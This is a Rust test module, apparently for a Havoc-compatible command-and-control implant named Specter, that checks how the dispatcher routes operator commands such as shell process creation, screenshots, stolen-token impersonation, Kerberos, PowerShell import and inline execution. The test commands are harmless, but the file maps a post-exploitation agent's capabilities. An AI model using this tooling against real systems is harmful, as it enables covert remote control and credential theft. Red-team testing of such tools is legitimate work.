        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn package_dropped_does_not_affect_unrelated_downloads() {
        let mut config = SpecterConfig::default();
        let mut downloads = DownloadTracker::new();

        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_pkg_drop_unrel_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write temp");
        let file = std::fs::File::open(&path).expect("open temp");
        let file_id = downloads.add(file, 100, 4); // request_id=100

        // Package dropped for request_id=99 — should NOT affect download with request_id=100.
        let payload = le_u32_pair(0x20000, 0x10000);
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
        dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );

        let entry = downloads.get(file_id).expect("entry should exist");
        assert_eq!(entry.state, DownloadState::Running);
        let _ = std::fs::remove_file(path);
    }

    // ── Dispatch routing completeness ────────────────────────────────────────

    #[test]
    fn dispatch_routes_command_sleep() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(500, 10);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_fs_pwd() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(u32::from(DemonFilesystemCommand::GetPwd));
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_proc_list() {
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec(); // process_ui = 0
        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_net_domain() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(1); // DemonNetCommand::Domain = 1
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_token_getuid() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(6); // GetUid = 6
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_config() {
        let mut config = SpecterConfig::default();
        // Config key 0 (Sleep) + u32 value
        let mut payload = Vec::new();
        payload.extend_from_slice(&0u32.to_le_bytes()); // key = Sleep
        payload.extend_from_slice(&42u32.to_le_bytes()); // value
        let package = DemonPackage::new(DemonCommand::CommandConfig, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // Config handler returns Ignore for most valid updates (no response ack).
        // Just verify it doesn't panic.
        let _ = result;
    }

    #[test]
    fn dispatch_routes_command_screenshot() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandScreenshot, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_kerberos() {
        let mut config = SpecterConfig::default();
        // Kerberos subcommand 0 = Luid
        let payload = le_subcmd(0);
        let package = DemonPackage::new(DemonCommand::CommandKerberos, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_output_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandOutput, 1, vec![0xAA]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "CommandOutput from server must be ignored"
        );
    }

    #[test]
    fn dispatch_routes_beacon_output_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::BeaconOutput, 1, vec![0xBB]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "BeaconOutput from server must be ignored"
        );
    }

    #[test]
    fn dispatch_routes_command_get_job_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandGetJob, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "CommandGetJob from server must be ignored"
        );
    }

    // ── handle_sleep edge cases ──────────────────────────────────────────────

    #[test]
    fn handle_sleep_zero_delay_and_zero_jitter() {
        let mut config = SpecterConfig::default();
        config.sleep_delay_ms = 1000; // non-zero initial
        config.sleep_jitter = 50;
        let payload = le_u32_pair(0, 0);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert_eq!(config.sleep_delay_ms, 0);
        assert_eq!(config.sleep_jitter, 0);
    }

    #[test]
    fn handle_sleep_max_u32_delay() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(u32::MAX, 100);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert_eq!(config.sleep_delay_ms, u32::MAX);
        assert_eq!(config.sleep_jitter, 100);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let echoed_delay = u32::from_le_bytes(resp.payload[0..4].try_into().expect("delay"));
        assert_eq!(echoed_delay, u32::MAX);
    }

    // ── handle_fs_cd edge cases ──────────────────────────────────────────────

    #[test]
    fn handle_fs_cd_nonexistent_directory_returns_ignore() {
        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(4); // Cd = 4
        payload.extend_from_slice(&le_utf16le_payload("/nonexistent_dir_xyz_99999"));
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "cd to nonexistent directory must return Ignore"
        );
    }

    // ── handle_fs_dir edge cases ─────────────────────────────────────────────

    #[test]
    fn handle_fs_dir_nonexistent_path_returns_ignore() {
        let payload = dir_request_payload(
            "/nonexistent_dir_xyz_99999",
            false,
            false,
            false,
            false,
            "",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "dir on nonexistent path must return Ignore"
        );
    }

    #[test]
    fn handle_fs_dir_files_only_excludes_directories() {
        let dir = std::env::temp_dir();
        let base = dir.join(format!("specter_dir_fonly_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&base).expect("create base dir");
        // Create a file and a subdirectory.
        std::fs::write(base.join("file.txt"), b"hello").expect("write file");
        std::fs::create_dir(base.join("subdir")).expect("create subdir");

        let payload = dir_request_payload(
            &base.display().to_string(),
            false,
            true, // files_only
            false,
            true, // list_only (simpler output)
            "",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for dir listing");
        };
        // Verify the response payload doesn't contain "subdir".
        // The response uses UTF-16LE encoding, so search for "subdir" encoded.
        let subdir_utf16: Vec<u8> = "subdir".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            !resp.payload.windows(subdir_utf16.len()).any(|w| w == subdir_utf16.as_slice()),
            "files_only must exclude directory entries"
        );
        let file_utf16: Vec<u8> = "file.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            resp.payload.windows(file_utf16.len()).any(|w| w == file_utf16.as_slice()),
            "files_only must include file entries"
        );
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn handle_fs_dir_dirs_only_excludes_files() {
        let dir = std::env::temp_dir();
        let base = dir.join(format!("specter_dir_donly_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&base).expect("create base dir");
        std::fs::write(base.join("file.txt"), b"hello").expect("write file");
        std::fs::create_dir(base.join("subdir")).expect("create subdir");

        let payload = dir_request_payload(
            &base.display().to_string(),
            false,
            false,
            true, // dirs_only
            true, // list_only
            "",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for dir listing");
        };
        let file_utf16: Vec<u8> = "file.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            !resp.payload.windows(file_utf16.len()).any(|w| w == file_utf16.as_slice()),
            "dirs_only must exclude file entries"
        );
        let subdir_utf16: Vec<u8> = "subdir".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            resp.payload.windows(subdir_utf16.len()).any(|w| w == subdir_utf16.as_slice()),
            "dirs_only must include directory entries"
        );
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn handle_fs_dir_name_filter_starts_with() {
        let dir = std::env::temp_dir();
        let base = dir.join(format!("specter_dir_filter_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&base).expect("create base dir");
        std::fs::write(base.join("alpha.txt"), b"a").expect("write alpha");
        std::fs::write(base.join("beta.txt"), b"b").expect("write beta");

        let payload = dir_request_payload(
            &base.display().to_string(),
            false,
            false,
            false,
            true, // list_only
            "alpha",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for dir listing");
        };
        let alpha_utf16: Vec<u8> =
            "alpha.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            resp.payload.windows(alpha_utf16.len()).any(|w| w == alpha_utf16.as_slice()),
            "starts_with filter must include matching entries"
        );
        let beta_utf16: Vec<u8> = "beta.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            !resp.payload.windows(beta_utf16.len()).any(|w| w == beta_utf16.as_slice()),
            "starts_with filter must exclude non-matching entries"
        );
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn handle_fs_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(0xFF_FF); // bogus subcommand
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn handle_fs_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_proc edge cases ───────────────────────────────────────────────

    #[test]
    fn handle_proc_create_captures_stderr() {
        let mut config = SpecterConfig::default();
        // Run a command that writes to stderr.
        let mut payload = Vec::new();
        payload.extend_from_slice(&le_subcmd(u32::from(DemonProcessCommand::Create)));
        payload.extend_from_slice(&0u32.to_le_bytes()); // process_state
        payload.extend_from_slice(&le_utf16le_payload("")); // process_path (empty → /bin/sh)
        payload.extend_from_slice(&le_utf16le_payload("/c echo stderr_test >&2"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::MultiRespond(responses) = result else {
            panic!("expected MultiRespond for proc create");
        };
        assert_eq!(responses.len(), 2, "proc create returns 2 responses");
        // Second response is CommandOutput with captured output.
        let output_resp = &responses[1];
        assert_eq!(output_resp.command_id, u32::from(DemonCommand::CommandOutput));
        // Parse the output payload (LE length-prefixed bytes).
        let output_len =
            u32::from_le_bytes(output_resp.payload[0..4].try_into().expect("len")) as usize;
        let output_bytes = &output_resp.payload[4..4 + output_len];
        let output_str = String::from_utf8_lossy(output_bytes);
        assert!(
            output_str.contains("stderr_test"),
            "proc create must capture stderr — got: {output_str}"
        );
    }

    #[test]
    fn handle_proc_create_nonzero_exit_code_still_succeeds() {
        let mut config = SpecterConfig::default();
        let mut payload = Vec::new();
        payload.extend_from_slice(&le_subcmd(u32::from(DemonProcessCommand::Create)));
        payload.extend_from_slice(&0u32.to_le_bytes()); // process_state
        payload.extend_from_slice(&le_utf16le_payload("")); // process_path
        payload.extend_from_slice(&le_utf16le_payload("/c exit 42"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // Even with a non-zero exit code, the handler should return MultiRespond
        // (the process ran, it just exited non-zero).
        let DispatchResult::MultiRespond(responses) = result else {
            panic!("expected MultiRespond for proc create with non-zero exit");
        };
        assert_eq!(responses.len(), 2);
    }

    #[test]
    fn handle_proc_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn handle_proc_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(0xFFFF); // bogus subcommand
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn handle_proc_grep_matches_self_pid() {
        let mut config = SpecterConfig::default();
        // Use empty needle (matches all).
        let mut payload = Vec::new();
        payload.extend_from_slice(&le_subcmd(u32::from(DemonProcessCommand::Grep)));
        payload.extend_from_slice(&le_utf16le_payload(""));
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for proc grep");
        };
        // Parse response: subcmd(4) + repeated entries.
        // Each entry contains a PID field. Verify our PID is in there.
        assert!(resp.payload.len() > 4, "proc grep with empty needle should return entries");
    }

    // ── handle_proc_list edge cases ──────────────────────────────────────────

    #[test]
    fn handle_proc_list_empty_payload_uses_default_flag() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // ProcList should still respond even with empty payload (uses default process_ui = 0).
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── handle_net edge cases ────────────────────────────────────────────────

    #[test]
    fn dispatch_routes_command_net_empty_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_ps_import edge cases ──────────────────────────────────────────

    #[test]
    fn ps_import_accumulates_across_multiple_imports() {
        let mut config = SpecterConfig::default();
        let mut ps_scripts = Vec::new();
        let mut mem_files: MemFileStore = HashMap::new();

        // First import
        let script1 = b"function Get-Foo { 'foo' }\n";
        let mut payload1 = (script1.len() as u32).to_le_bytes().to_vec();
        payload1.extend_from_slice(script1);
        let package1 = DemonPackage::new(DemonCommand::CommandPsImport, 1, payload1);
        let _ = dispatch(
            &package1,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut ps_scripts,
        );
        assert_eq!(ps_scripts.len(), script1.len());

        // Second import — should replace (not accumulate).
        let script2 = b"function Get-Bar { 'bar' }\n";
        let mut payload2 = (script2.len() as u32).to_le_bytes().to_vec();
        payload2.extend_from_slice(script2);
        let package2 = DemonPackage::new(DemonCommand::CommandPsImport, 2, payload2);
        let _ = dispatch(
            &package2,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut ps_scripts,
        );
        // After second import, the stored script should be the second one.
        assert_eq!(ps_scripts.len(), script2.len());
    }

    // ── handle_token edge cases ──────────────────────────────────────────────

    #[test]
    fn token_impersonate_valid_id_on_non_windows_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        // Add a token entry manually (on non-Windows it's a stub).
        use crate::token::{TokenEntry, TokenType};
        vault.add(TokenEntry {
            handle: 0,
            domain_user: "DOMAIN\\user".into(),
            process_id: 0,
            token_type: TokenType::Stolen,
            credentials: None,
        });

        let mut payload = Vec::new();
        payload.extend_from_slice(&1u32.to_le_bytes()); // subcommand = Impersonate (= 1)
        payload.extend_from_slice(&0u32.to_le_bytes()); // vault index = 0
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // On non-Windows, impersonation fails because there's no real handle.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── handle_memfile edge cases ────────────────────────────────────────────

    #[test]
    fn memfile_zero_size_completes_immediately() {
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();

        // Send a memfile with expected_size=0 and empty data.
        let mut payload = Vec::new();
        payload.extend_from_slice(&1u32.to_le_bytes()); // file_id = 1
        payload.extend_from_slice(&0u64.to_le_bytes()); // expected_size = 0 (u64)
        payload.extend_from_slice(&0u32.to_le_bytes()); // chunk_len = 0
        let package = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // Zero-size memfile should return an ack response and be stored.
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert!(mem_files.contains_key(&1));
    }

    // ── handle_inline_execute edge cases ─────────────────────────────────────

    #[test]
    fn dispatch_routes_command_inline_execute() {
        let mut config = SpecterConfig::default();
        // Minimal payload that will fail parsing (too short).
        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, vec![0x00]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // Short payload → returns CouldNotRun response.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_ps_import() {
        let mut config = SpecterConfig::default();
        // Empty script (0-length).
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandPsImport, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // Empty script returns error response.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_assembly_inline_execute() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandAssemblyInlineExecute, 1, vec![0x00]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // Short payload → returns error response.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }
}
